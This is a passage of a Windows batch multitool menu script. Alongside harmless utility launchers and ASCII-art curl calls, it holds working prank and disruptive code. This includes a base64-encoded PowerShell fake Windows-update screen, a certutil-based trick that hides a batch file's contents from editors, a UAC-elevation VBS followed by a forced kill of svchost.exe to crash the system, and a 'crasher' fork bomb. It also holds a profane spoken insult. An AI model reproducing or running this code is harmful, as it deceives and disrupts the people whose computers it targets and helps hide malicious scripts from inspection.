AZQA7ACAAJABMAGEAYgBlAGwALgBGAG8AbgB0ACAAPQAgACcATAB1AGMAaQBkAGEAIABDAG8AbgBzAG8AbABlACwAIAAxADYAcAB0ACwAIABzAHQAeQBsAGUAPQBSAGUAZwB1AGwAYQByACcAOwAgACQATABhAGIAZQBsAC4ATABvAGMAYQB0AGkAbwBuACAAPQAgACcAMAAsACAAMwAwACcAOwAgACQARgBvAHIAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ARgBvAHIAbQA7ACAAJABGAG8AcgBtAC4AQQBkAGQAXwBLAGUAeQBEAG8AdwBuACgAewAgAGkAZgAoACQAXwAuAEsAZQB5AEMAbwBkAGUAIAAtAGUAcQAgACcAUAAnACkAIAB7ACAAJABGAG8AcgBtAC4AQwBsAG8AcwBlACgAKQAgAH0AOwAgAGkAZgAoACQAXwAuAEsAZQB5AEMAbwBkAGUAIAAtAGUAcQAgACcAUgAnACkAIAB7ACAAUgBlAHMAdABhAHIAdAAtAEMAbwBtAHAAdQB0AGUAcgAgAC0ARgBvAHIAYwBlACAAfQAgAH0AKQA7ACAAJABGAG8AcgBtAC4AQwBvAG4AdAByAG8AbABzAC4AQQBkAGQAKAAkAEwAYQBiAGUAbAApADsAIAAkAEYAbwByAG0ALgBXAGkAbgBkAG8AdwBTAHQAYQB0AGUAIAA9ACAAJwBNAGEAeABpAG0AaQB6AGUAZAAnADsAIAAkAEYAbwByAG0ALgBGAG8AcgBtAEIAbwByAGQAZQByAFMAdAB5AGwAZQAgAD0AIAAnAE4AbwBuAGUAJwA7ACAAJABGAG8AcgBtAC4AQgBhAGMAawBDAG8AbABvAHIAIAA9ACAAJwAjADAAMAAwADAAOAAwACcAOwAgACQARgBvAHIAbQAuAEMAdQByAHMAbwByAD0AWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBDAHUAcgBzAG8AcgBzAF0AOgA6AFcAYQBpAHQAQwB1AHIAcwBvAHIAOwAgACQARgBvAHIAbQAuAFMAaABvAHcARABpAGEAbABvAGcAKAApAA==
pause
goto page-3

:Fake-Update-Screen
cls
powershell -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAKAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcACgAKACQAZgBvAHIAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ARgBvAHIAbQAKACQAZgBvAHIAbQAuAEIAYQBjAGsAQwBvAGwAbwByACAAPQAgAFsAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4AQwBvAGwAbwByAF0AOgA6AEIAbABhAGMAawAKACQAZgBvAHIAbQAuAEYAbwByAG0AQgBvAHIAZABlAHIAUwB0AHkAbABlACAAPQAgACcATgBvAG4AZQAnAAoAJABmAG8AcgBtAC4AVwBpAG4AZABvAHcAUwB0AGEAdABlACAAPQAgACcATQBhAHgAaQBtAGkAegBlAGQAJwAKACQAZgBvAHIAbQAuAFQAbwBwAE0AbwBzAHQAIAA9ACAAJAB0AHIAdQBlAAoAJABmAG8AcgBtAC4ASwBlAHkAUAByAGUAdgBpAGUAdwAgAD0AIAAkAHQAcgB1AGUACgAKACQAcwBjAHIAZQBlAG4AIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBTAGMAcgBlAGUAbgBdADoAOgBQAHIAaQBtAGEAcgB5AFMAYwByAGUAZQBuAC4AQgBvAHUAbgBkAHMACgAkAHcAaQBkAHQAaAAgAD0AIAAkAHMAYwByAGUAZQBuAC4AVwBpAGQAdABoAAoAJABoAGUAaQBnAGgAdAAgAD0AIAAkAHMAYwByAGUAZQBuAC4ASABlAGkAZwBoAHQACgAKACMAIABTAHAAaQBuAG4AaQBuAGcAIABMAG8AYQBkAGUAcgAgACgAQwBpAHIAYwBsAGUAKQAgAC0AIABDAGUAbgB0AGUAcgBlAGQACgAkAGwAbwBhAGQAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBMAGEAYgBlAGwACgAkAGwAbwBhAGQAZQByAC4AVABlAHgAdAAgAD0AIAAiACIACgAkAGwAbwBhAGQAZQByAC4ARgBvAHIAZQBDAG8AbABvAHIAIAA9ACAAJwBXAGgAaQB0AGUAJwAKACQAbABvAGEAZABlAHIALgBGAG8AbgB0ACAAPQAgACIAUwBlAGcAbwBlACAAVQBJACwAIAAzADYAcAB0ACIACgAkAGwAbwBhAGQAZQByAC4AQQB1AHQAbwBTAGkAegBlACAAPQAgACQAdAByAHUAZQAKACQAbABvAGEAZABlAHIALgBMAG8AYwBhAHQAaQBvAG4AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAFAAbwBpAG4AdAAoAFsAaQBuAHQAXQAoACQAdwBpAGQAdABoAC8AMgAgAC0AIAAyADUAKQAsACAAWwBpAG4AdABdACgAJABoAGUAaQBnAGgAdAAvADIAIAAtACAAMQA1ADAAKQApAAoACgAjACAATQBhAGkAbgAgAEMAZQBuAHQAZQByACAAVABlAHgAdAAgAC0AIABQAGUAcgBmAGUAYwB0AGwAeQAgAEMAZQBuAHQAZQByAGUAZAAKACQAdAB4AHQATQBhAGkAbgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATABhAGIAZQBsAAoAJAB0AHgAdABNAGEAaQBuAC4AVABlAHgAdAAgAD0AIAAiAFcAbwByAGsAaQBuAGcAIABvAG4AIAB1AHAAZABhAHQAZQBzACAAMwAwACUAYABuAFAAbABlAGEAcwBlACAAawBlAGUAcAAgAHkAbwB1AHIAIABjAG8AbQBwAHUAdABlAHIAIABvAG4ALgAiAAoAJAB0AHgAdABNAGEAaQBuAC4ARgBvAHIAZQBDAG8AbABvAHIAIAA9ACAAJwBXAGgAaQB0AGUAJwAKACQAdAB4AHQATQBhAGkAbgAuAEYAbwBuAHQAIAA9ACAAIgBTAGUAZwBvAGUAIABVAEkALAAgADEANgBwAHQAIgAKACQAdAB4AHQATQBhAGkAbgAuAFMAaQB6AGUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAFMAaQB6AGUAKAAkAHcAaQBkAHQAaAAsACAAMQAwADAAKQAKACQAdAB4AHQATQBhAGkAbgAuAEwAbwBjAGEAdABpAG8AbgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4AUABvAGkAbgB0ACgAMAAsACAAWwBpAG4AdABdACgAJABoAGUAaQBnAGgAdAAvADIAIAAtACAANQAwACkAKQAKACQAdAB4AHQATQBhAGkAbgAuAFQAZQB4AHQAQQBsAGkAZwBuACAAPQAgACcATQBpAGQAZABsAGUAQwBlAG4AdABlAHIAJwAKAAoAIwAgAEIAbwB0AHQAbwBtACAAVABlAHgAdAAKACQAdAB4AHQAQgBvAHQAdABvAG0AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEwAYQBiAGUAbAAKACQAdAB4AHQAQgBvAHQAdABvAG0ALgBUAGUAeAB0ACAAPQAgACIAWQBvAHUAcgAgAGMAbwBtAHAAdQB0AGUAcgAgAG0AYQB5ACAAcgBlAHMAdABhAHIAdAAgAGEAIABmAGUAdwAgAHQAaQBtAGUAcwAgAHQAbwAgAGEAcABwAGwAeQAgAHUAcABkAGEAdABlAHMAIABiAGUAZgBvAHIAZQAgAGkAdAAgAHMAaAB1AHQAcwAgAGQAbwB3AG4ALgBgAG4AYABuAFAAcgBlAHMAcwAgAFIAIAB0AG8AIABSAGUAcwB0AGEAcgB0ACAAQwBvAG0AcAB1AHQAZQByACIACgAkAHQAeAB0AEIAbwB0AHQAbwBtAC4ARgBvAHIAZQBDAG8AbABvAHIAIAA9ACAAJwBXAGgAaQB0AGUAJwAKACQAdAB4AHQAQgBvAHQAdABvAG0ALgBGAG8AbgB0ACAAPQAgACIAUwBlAGcAbwBlACAAVQBJACwAIAAxADQAcAB0ACIACgAkAHQAeAB0AEIAbwB0AHQAbwBtAC4AUwBpAHoAZQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4AUwBpAHoAZQAoACQAdwBpAGQAdABoACwAIAAxADAAMAApAAoAJAB0AHgAdABCAG8AdAB0AG8AbQAuAEwAbwBjAGEAdABpAG8AbgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4AUABvAGkAbgB0ACgAMAAsACAAJABoAGUAaQBnAGgAdAAgAC0AIAAxADUAMAApAAoAJAB0AHgAdABCAG8AdAB0AG8AbQAuAFQAZQB4AHQAQQBsAGkAZwBuACAAPQAgACcATQBpAGQAZABsAGUAQwBlAG4AdABlAHIAJwAKAAoAJABmAG8AcgBtAC4AQwBvAG4AdAByAG8AbABzAC4AQQBkAGQAKAAkAGwAbwBhAGQAZQByACkACgAkAGYAbwByAG0ALgBDAG8AbgB0AHIAbwBsAHMALgBBAGQAZAAoACQAdAB4AHQATQBhAGkAbgApAAoAJABmAG8AcgBtAC4AQwBvAG4AdAByAG8AbABzAC4AQQBkAGQAKAAkAHQAeAB0AEIAbwB0AHQAbwBtACkACgAKACMAIABBAG4AaQBtAGEAdABpAG8AbgAgAGYAbwByACAAdABoAGUAIABjAGkAcgBjAGwAZQAgAGwAbwBhAGQAZQByAAoAJAB0AGkAbQBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAFQAaQBtAGUAcgAKACQAdABpAG0AZQByAC4ASQBuAHQAZQByAHYAYQBsACAAPQAgADEAMAAwAAoAJABnAGwAbwBiAGEAbAA6AGkAIAA9ACAAMAAKACQAcwBwAGkAbgBDAGgAYQByAHMAIAA9ACAAQAAoACcACygnACwAJwAZKCcALAAnACcALAAnADgoJwAsACcAPCgnACwAJwAnACwAJwAmKCcALAAnACcoJwAsACcAJwAsACcADygnACkACgAkAHQAaQBtAGUAcgAuAEEAZABkAF8AVABpAGMAawAoAHsACgAgACAAIAAgACQAbABvAGEAZABlAHIALgBUAGUAeAB0ACAAPQAgACQAcwBwAGkAbgBDAGgAYQByAHMAWwAkAGcAbABvAGIAYQBsADoAaQAgACUAIAAxADAAXQAKACAAIAAgACAAJABnAGwAbwBiAGEAbAA6AGkAKwArAAoAfQApAAoACgAkAGYAbwByAG0ALgBBAGQAZABfAFMAaABvAHcAbgAoAHsAIAAkAHQAaQBtAGUAcgAuAFMAdABhAHIAdAAoACkAIAB9ACkACgAKACQAZgBvAHIAbQAuAEEAZABkAF8ASwBlAHkARABvAHcAbgAoAHsACgAgACAAIAAgAGkAZgAgACgAJABfAC4ASwBlAHkAQwBvAGQAZQAgAC0AZQBxACAAJwBSACcAKQAgAHsAIABSAGUAcwB0AGEAcgB0AC0AQwBvAG0AcAB1AHQAZQByACAALQBGAG8AcgBjAGUAIAB9AAoAIAAgACAAIABpAGYAIAAoACQAXwAuAEsAZQB5AEMAbwBkAGUAIAAtAGUAcQAgACcAUAAnACkAIAB7ACAAJABmAG8AcgBtAC4AQwBsAG8AcwBlACgAKQAgAH0ACgB9ACkACgAKACQAZgBvAHIAbQAuAFMAaABvAHcARABpAGEAbABvAGcAKAApAA==
pause
goto page-3

:obfuscator
setlocal enabledelayedexpansion
cls
cd ..
if not exist "output\obfuscator" mkdir "output\obfuscator"
cd output\obfuscator
echo ==========================================
echo    Batch File Obfuscator
echo ==========================================
echo.
set "filepath="
set /p "filepath=Enter the full file location to obfuscate: "

:: Remove any surrounding quotes the user might have pasted
set "filepath=%filepath:"=%"

if "%filepath%"=="" (
    echo [!] Error: No file location entered.
    timeout /t 2 >nul
    goto obfuscator
)

if not exist "%filepath%" (
    echo [!] Error: File not found - "%filepath%"
    timeout /t 2 >nul
    goto obfuscator
)

:: Extract file name and extension (equivalent to %~n1 and %~x1)
for %%F in ("%filepath%") do (
    set "filename=%%~nF"
    set "extension=%%~xF"
)

if /i "%extension%" neq ".bat" if /i "%extension%" neq ".cmd" (
    echo [!] Error: Invalid file type. Only .bat and .cmd files are supported.
    timeout /t 2 >nul
    goto obfuscator
)

:: Check for certutil.exe
for /f %%i in ("certutil.exe") do if not exist "%%~$path:i" (
    echo [!] Error: CertUtil.exe not found in system PATH.
    pause
    goto page-3
)

echo.
echo [+] Obfuscating "%filepath%" ...

:: Create temp base64 file
>"temp.~b64" echo(//4mY2xzDQo=

:: Decode to a temporary file in the current directory
certutil.exe -f -decode "temp.~b64" "%filename%_obfuscated_%extension%" >nul 2>&1
del "temp.~b64"

:: Concatenate the temporary file with the original file
copy "%filename%_obfuscated_%extension%" /b + "%filepath%" /b >nul 2>&1

echo.
echo [SUCCESS] File obfuscated successfully!
echo [OUTPUT] Saved as: "%cd%\%filename%_obfuscated_%extension%"
echo.
cd files
pause
goto page-3

:notepad-CMD
cls
edit
pause
goto page-3

:windows-system-Info
cls
msinfo32
pause
goto page-3

:remote-assistance
cls
msra
pause
goto page-3

:system-properties
cls
SystemPropertiesComputerName
pause
goto page-3

:sudo
cls
sudo
pause
goto page-3

:create-share-folder
cls
shrpubw
pause
goto page-3

:sdclt
cls
sdclt
pause
goto page-3

:presentation-settings
cls
presentationsettings
pause
goto page-3

:resource-monitor
cls
resmon
pause
goto page-3

:user-account
cls
Netplwiz
pause
goto page-3

:nslookup
cls
nslookup
pause 
goto page-3

:kitty-curl
cls
color D
curl ascii.live/kitty
pause
goto start 

:rick-curl
cls
curl ascii.live/rick
pause
goto start

:runman-curl
cls
curl ascii.live/forrest
pause
goto start

:starwars-curl
cls
telnet towel.blinkenlights.nl
pause
goto start

:Clock
color 00
:main-clock
cls
echo.
echo Time:%time%
echo.
echo Date: %date%
echo.
ping -n 2 0.0.0.0>nul
goto main-clock

:Hello-World!
cls
echo.
echo.
echo  __    __   _______  __       __        ______      ____    __    ____  ______   .______       __       _______   __  
echo |  |  |  | |   ____||  |     |  |      /  __  \     \   \  /  \  /   / /  __  \  |   _  \     |  |     |       \ |  | 
echo |  |__|  | |  |__   |  |     |  |     |  |  |  |     \   \/    \/   / |  |  |  | |  |_)  |    |  |     |  .--.  ||  | 
echo |   __   | |   __|  |  |     |  |     |  |  |  |      \            /  |  |  |  | |      /     |  |     |  |  |  ||  | 
echo |  |  |  | |  |____ |  `----.|  `----.|  `--'  |       \    /\    /   |  `--'  | |  |\  \----.|  `----.|  '--'  ||__| 
echo |__|  |__| |_______||_______||_______| \______/         \__/  \__/     \______/  | _| `._____||_______||_______/ (__) 
echo
echo.
echo.    
pause
goto page-2

:fuck-you
cls
echo Fuck you, little bro, Bitch ass Motherfucker.
powershell -Command "Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('Fuck you little bro Bitch ass Motherfucker.')"
echo Your not funny, little bro.
powershell -Command "Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('Your not funny little bro.')"
echo.
echo.
echo ⠀⠀     ⢀⡤⠤⣄⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀     ⣾⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀
echo ⠀⠀     ⡏⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀
echo ⠀  ⠀   ⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀
echo  ⠀    ⢸⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀
echo    ⢀⡾⠋⠻⡇⠀⠀⢸⣧⣀⡀⠀⠀⠀⠀
echo  ⠀⢀⣾⠁⠀⠀⡇⠀⠀⢸⠁⠀⢹⣀⠀⠀⠀
echo ⢀⡴⠋⡟⠀⠀⢠⡇⠀⠀⢸⠀⠀⠀⡇⠉⢆⠀
echo ⡎⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠈⣆
echo ⢷⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
echo ⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾
echo ⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁
echo ⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⢰⠋⠀⠀
echo ⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠛⠒⠒⠒⠒⠒⠒⠒⠚⠃⠀⠀⠀
timeout /t 3
goto start

:Blue-Screen
cls
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :isAdmin-BSoD
) else (
    goto :escalate-BSoD
)

:escalate-BSoD
set "ARG1=%~1"
if not defined ARG1 set "ARG1=none"
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "%ARG1% isAdmin-BSoD", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /b

:isAdmin-BSoD
cls
TASKKILL /IM svchost.exe /F
pause
goto :start

:crasher
cls
color A
:begin
call :bg-crash
:after-crasher
echo [92m,1m Are you sure you want to crash this computer?[0m
echo [31m,1m This will close all windows, files, and overload your RAM![0m
echo [92m,1m Type confirmcrash to confirm you want to crash this computer.[0m
echo [92m,1m Type exitprogram to exit the program.[0m
set /p input=">>"
if %input% EQU confirmcrash goto crash
if %input% EQU exitprogram exit

:crash
start
goto crash
pause
goto start

:bg-crash
echo.
echo.
echo [96m ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ [0m
echo [96m▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌[0m
echo [96m▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌[0m
echo [96m▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌[0m
echo [96m▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌[0m
echo [96m▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌[0m
echo [96m▐░▌          ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ [0m
echo [96m▐░▌          ▐░▌     ▐░▌  ▐░▌       ▐░▌          ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  [0m
echo [96m▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ [0m
echo [96m▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌[0m
echo [96m ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ [0m
echo.
echo.
pause
goto after-crasher

 
:banner
echo.
echo.
echo            [38;2;255;0;0m██████╗ ██████╗  ██████╗     ███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗ ██████╗  ██████╗ ██╗[0m     
echo            [38;2;255;0;0m██╔══██╗██╔══██╗██╔════╝     ████╗ ████║██║   ██║██║  ╚══██╔══╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║[0m     
echo            [38;2;255;0;0m██║  ██║██████╔╝██║  ███╗    ██╔████╔██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║[0m     
echo            [38;2;255;0;0m██║  ██║██╔══██╗██║   ██║    ██║╚██╔╝██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║[0m     
echo            [38;2;255;0;0m██████╔╝██████╔╝╚██████╔╝    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║   ██║   ╚██████╔╝╚██████╔╝███████╗[0m
echo            [38;2;255;0;0m╚═════╝ ╚═════╝  ╚═════╝     ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝[0m
echo.
echo.
